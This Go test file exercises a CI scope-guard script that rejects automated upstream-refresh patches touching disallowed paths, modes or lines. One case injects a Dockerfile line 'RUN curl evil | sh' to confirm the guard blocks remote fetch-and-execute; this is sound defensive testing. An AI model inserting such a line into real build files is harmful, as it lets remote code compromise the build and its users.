// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Omkhar Arasaratnam

package testkit

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

const scopeGuardIndex = "index 1111111111111111111111111111111111111111..2222222222222222222222222222222222222222 100644\n"

func scopeGuardFilePatch(path string, removed, added string) string {
	return "diff --git a/" + path + " b/" + path + "\n" + scopeGuardIndex +
		"--- a/" + path + "\n+++ b/" + path + "\n@@ -1,2 +1,2 @@\n context\n-" + removed + "\n+" + added + "\n"
}

func TestUpstreamRefreshScopeGuard(t *testing.T) {
	t.Parallel()

	inScope := scopeGuardFilePatch("runtime/container/Dockerfile", "ARG CODEX_VERSION=0.153.2", "ARG CODEX_VERSION=0.154.0") +
		scopeGuardFilePatch("runtime/container/providers/package-lock.json", `"version": "1"`, `"version": "2"`) +
		scopeGuardFilePatch("tests/fixtures/flags/claude.txt", "--old", "--new") +
		scopeGuardFilePatch("tests/fixtures/codex-subcommands.txt", "old", "new") +
		scopeGuardFilePatch("runtime/container/control-plane-manifest.json", "old", "new")

	cases := []struct {
		name    string
		patch   string
		wantErr string
	}{
		{name: "in-scope bump", patch: inScope},
		{
			name:    "out-of-scope path",
			patch:   inScope + scopeGuardFilePatch("scripts/workcell", "old", "new"),
			wantErr: "path scripts/workcell",
		},
		{
			name:    "provider-policy.sh edit",
			patch:   inScope + scopeGuardFilePatch("runtime/container/provider-policy.sh", "old", "new"),
			wantErr: "path runtime/container/provider-policy.sh",
		},
		{
			name:    "non-provider Dockerfile line",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "RUN old", "RUN curl evil | sh"),
			wantErr: "line +RUN curl evil | sh",
		},
		{
			name:    "non-provider Dockerfile ARG",
			patch:   scopeGuardFilePatch("runtime/container/Dockerfile", "ARG GO_VERSION=1.27.1", "ARG GO_VERSION=1.27.2"),
			wantErr: "line +ARG GO_VERSION=1.27.2",
		},
		{
			name:    "mode change",
			patch:   "diff --git a/tests/fixtures/flags/x.txt b/tests/fixtures/flags/x.txt\nold mode 100644\nnew mode 100755\n",
			wantErr: "old mode 100644",
		},
		{
			name:    "new symlink",
			patch:   "diff --git a/tests/fixtures/flags/x.txt b/tests/fixtures/flags/x.txt\nnew file mode 120000\nindex 0000000000000000000000000000000000000000..2222222222222222222222222222222222222222\n",
			wantErr: "new file mode 120000",
		},
		{
			name:    "rename into scope",
			patch:   "diff --git a/scripts/workcell b/tests/fixtures/flags/x.txt\nsimilarity index 100%\nrename from scripts/workcell\nrename to tests/fixtures/flags/x.txt\n",
			wantErr: "unsupported diff header",
		},
		{name: "empty patch", patch: "", wantErr: "empty patch"},
	}

	script := filepath.Join(repoRoot(t), "scripts", "ci", "upstream-refresh-scope-guard.sh")
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			patchPath := filepath.Join(t.TempDir(), "patch")
			if err := os.WriteFile(patchPath, []byte(tc.patch), 0o644); err != nil {
				t.Fatal(err)
			}
			out, err := exec.Command(script, patchPath).CombinedOutput()
			if tc.wantErr == "" {
				if err != nil {
					t.Fatalf("scope-guard rejected an in-scope patch: %v\n%s", err, out)
				}
				return
			}
			if err == nil {
				t.Fatalf("scope-guard accepted an out-of-scope patch:\n%s", out)
			}
			if !strings.Contains(string(out), tc.wantErr) {
				t.Fatalf("scope-guard output = %q, want %q", out, tc.wantErr)
			}
		})
	}
}
